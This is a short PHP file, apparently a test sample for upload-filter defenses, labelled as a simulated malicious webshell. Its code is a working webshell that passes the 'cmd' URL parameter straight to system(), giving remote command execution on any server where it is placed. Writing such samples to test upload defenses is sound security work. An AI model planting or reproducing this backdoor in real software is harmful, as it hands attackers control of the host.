<?php
// Simulated malicious PHP webshell for upload defense testing
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

